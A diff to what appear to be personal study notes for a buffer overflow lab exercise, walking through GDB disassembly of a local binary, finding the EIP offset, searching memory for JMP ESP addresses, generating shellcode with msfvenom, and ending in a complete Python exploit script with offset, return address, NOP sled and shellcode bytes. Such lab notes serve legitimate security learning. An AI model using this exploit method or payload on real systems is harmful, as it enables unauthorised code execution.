@@ -359,6 +359,7 @@ Behavioral Analysis
 Dynamic Analysis
 - command substitution ---> ./func $(echo "12345") ----> allows us to pass 12345 as a parameter
 - ./func <<<$(echo "12345") ---> simulates user input
+- basically testing to see what it wants
 - command substitution example: ls (cat example.txt)
 
 Investigate/Research
@@ -367,7 +368,7 @@ Investigate/Research
 - file to check if there is a file, load a file by typing "file ./func"
 
 Dissasemmbly
-- disass main or pdisass main (run pdisass again on the result)
+- disass main or pdisass main (run pdisass again on the result) --> !!DO THIS IN GDB
 - pdisass getuserinput
 - "what is the vulnerable function in the func file?" ---> you will get this answer after running pdisass cmds, answer will be the vulnerable one highlighted in red. (answer will be just the name, not including the @plt).
 
@@ -380,4 +381,43 @@ offset ="A" * 100 (in script created earlier)
 - run script in gdb
 - run <<<(python ben.py) ----> if it says file cant load, then try <file func>
 - Look at EIP ---> go back to ben.py ---> change offset (offset = " ") ---> paste new offset from wiremask ---> rerun script ---> copy and paste new EIP into wiremask ---> find the offset.
+- go back and change script to match newly found offset ---> offset = "A" * 62:
 
+
+find JMP ESP
+- in gdb, shell ---> env - gdb ./func --> do commands <unset ENV LINES> and <unset ENV COLUMNS> --> then show env
+- start (step through programp with "step" if you have a more complex program)
+- info proc map (might need to "file ./func" then start and info proc map again)
+- if file doesnt load try doing start again or file ./func
+- keep repeating step --> info proc map, until you find the stack and the heap in that file.
+- find /b <1st addr after heap>,<to the end of stack>, 0xff, 0xe4
+- find /b 0xf7de1000,0xffffe000,0xff,0xe4
+- copy first five addresses into your notes
+    0xf7de3b59
+    0xf7f588ab
+    0xf7f645fb
+    0xf7f6460f
+    0xf7f64aeb
+- break it up and convert to little endian to make it easier 0xf7de3b59 --> f7 de 3b 59 > "\x59\x3b\xde\f7"
+- go back to your script --> new eip, make it equal to the little endian above --> make nop in the script, nop = "\x90" * 15 --> declare them in the print statement
+
+
+
+msfvenom -p linux/x86/exec CMD=whoami -b "\x00\fe\x20\x0a\xff" -f python (run in gdb shell, will look like $)
+
+offset = "A" * 62
+#eip = "BBBB"
+
+eip = "\x59\x3b\xde\xf7"
+nop = "\x90" * 15
+
+buf =  b""
+buf += b"\xdb\xc8\xb8\xa6\x29\x75\x3f\xd9\x74\x24\xf4\x5a"
+buf += b"\x33\xc9\xb1\x0b\x31\x42\x19\x83\xc2\x04\x03\x42"
+buf += b"\x15\x44\xdc\x1f\x34\xd0\x86\xb2\x2c\x88\x95\x51"
+buf += b"\x38\xaf\x8e\xba\x49\x47\x4f\xad\x82\xf5\x26\x43"
+buf += b"\x54\x1a\xea\x73\x61\xdc\x0b\x84\x19\xb4\x64\xe5"
+buf += b"\x88\x2d\x7b\xb2\x01\x24\x9a\xf1\x26"
+
+
+print(offset + eip + nop + buf)
